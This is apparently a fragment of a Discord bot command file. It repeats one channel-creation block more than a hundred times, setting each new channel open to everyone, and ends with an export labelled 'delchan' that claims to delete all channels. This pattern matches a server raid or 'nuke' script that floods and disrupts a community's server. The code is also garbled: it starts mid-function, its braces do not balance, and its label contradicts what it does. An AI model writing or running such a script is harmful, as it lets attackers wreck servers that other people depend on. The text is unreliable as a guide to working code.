       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});

       message.guild.channels.create(name).then((chan) => {
          chan.updateOverwrite(message.guild.roles.everyone, {
            SEND_MESSAGES: true,
            VIEW_CHANNEL: true
          })
});




   exports.help = {
     name: 'delchan',
     description: 'Delete\'s all channels',
     usage: 'delchan'
   }}};